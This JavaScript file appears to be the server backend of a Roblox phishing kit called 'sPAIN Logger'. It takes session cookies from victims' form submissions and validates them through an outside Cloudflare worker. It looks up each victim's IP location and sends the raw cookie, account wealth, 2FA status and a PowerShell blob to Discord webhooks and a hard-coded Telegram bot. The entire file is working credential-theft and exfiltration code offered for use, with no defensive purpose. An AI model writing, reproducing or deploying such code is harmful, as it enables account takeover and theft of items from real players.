// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// ── Helpers ───────────────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    await fetch(
      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
  } catch (_) {}
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── Cookie extractor ──────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Worker ────────────────────────────────────────────────────────────────────
async function getWorkerData(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = '') {
  const wrap  = lang ? `\`\`\`${lang}\n` : '';
  const end   = lang ? '\n```' : '';
  const limit = 1990 - wrap.length - end.length;
  let rem = text, first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    await discordSend(url, { content: (first ? wrap : '') + chunk + (rem.length === 0 ? end : '') });
    first = false;
  }
}

// ── Embeds ────────────────────────────────────────────────────────────────────
async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
  // Rich account info embed
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh](${refreshUrl})` : ''}`,
      color:       5793266,
      thumbnail:   { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',      value: `${roblox.robux?.toLocaleString() || 0}`,                                               inline: true  },
        { name: '🎵 RAP',        value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`,  inline: true  },
        { name: '🗓️ Age',        value: `${roblox.accountAgeDays} days`,                                                        inline: true  },
        { name: '💎 Premium',    value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                  inline: true  },
        { name: '👥 Groups',     value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,      inline: true  },
        { name: '🌐 IP',         value: ip || 'Unknown',                                                                        inline: true  },
        { name: '📍 Location',   value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''), inline: false },
        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                     inline: false },
        { name: '🎯 Gamepasses', value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '📋 PowerShell', value: '```\n' + (powershell || '').substring(0, 1000) + '\n```', inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });

  // Full PS if longer than 1000 chars
  if (powershell && powershell.length > 1000) await discordChunked(webhookUrl, powershell, 'powershell');

  // Raw cookie — always sent plain so nothing gets cut
  await discordChunked(webhookUrl, cookie);

  // Refresh card
  if (refreshUrl) {
    await discordSend(webhookUrl, {
      embeds: [{
        title:       '🔄 Refresh PowerShell Anytime',
        description: `**${refreshUrl}**\nClick to get fresh info + command.`,
        color:       0x06b6d4,
        footer:      { text: 'sPAIN Tools • Keep private' }
      }]
    });
  }
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:  '⚠️ Invalid Cookie — trolling 💀',
      color:  0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
        { name: '🕐 Date',     value: now,                                                                                  inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` }
    }]
  });
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const cookie = findCookie(slots);
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;

  // Load parent + geo + worker ALL in parallel — fastest possible
  const [geo, workerData, parent] = await Promise.all([
    getIpGeo(ip),
    cookie ? getWorkerData(cookie, ip) : Promise.resolve(null),
    record.dualhookParent ? redisGet(`slot:${record.dualhookParent}`) : Promise.resolve(null)
  ]);

  const roblox     = workerData?.valid ? workerData : null;
  const powershell = workerData?.powershell || null;
  const webhooks   = [record.webhook, parent?.webhook && parent.webhook !== record.webhook ? parent.webhook : null].filter(Boolean);

  if (roblox && cookie) {
    // Save refresh entry
    const refreshId  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
    const refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
    await redisSet(`refresh:${refreshId}`, { cookie, webhook: record.webhook, webhook1: parent?.webhook || null, pageName: pName });

    const payload = { roblox, cookie, powershell, ip, geo, now, pageName: pName, refreshUrl };

    // Send to all webhooks in parallel
    await Promise.all(webhooks.map(wh => sendHit(wh, payload)));

    await tgSend([
      `✅ <b>HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
      `📄 Page: ${pName}`,
      `🔄 ${refreshUrl}`
    ].join('\n'));

  } else if (cookie && powershell) {
    // Worker failed to get info but we have PS — send what we have
    await Promise.all(webhooks.map(wh => discordSend(wh, {
      content: '@everyone',
      embeds: [{
        title:  `✅ Cookie Captured — ${pName}`,
        color:  0x00cc44,
        fields: [
          { name: '🌐 IP',       value: ip || 'Unknown',                                                                   inline: true  },
          { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                 inline: true  },
          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                             inline: true  },
          { name: '🕐 Time',     value: now,                                                                                inline: false }
        ],
        footer: { text: `sPAIN Logger • ${pName} • ${now}` }
      }]
    })));
    await Promise.all(webhooks.flatMap(wh => [discordChunked(wh, powershell, 'powershell'), discordChunked(wh, cookie)]));
    await tgSend(`⚠️ <b>WORKER FAIL — cookie sent\n📄 ${pName}\n🌐 <code>${ip}</code>`);

  } else {
    // No cookie
    await Promise.all(webhooks.map(wh => sendInvalid(wh, { ip, geo, now, pageName: pName })));
    await tgSend(`⚠️ <b>INVALID</b> — ${pName}\n🌐 <code>${ip}</code>`);
  }

  // Respond AFTER all work is done — fixes the "3 submits to send" Vercel bug
  return res.status(200).json({ success: true });
}
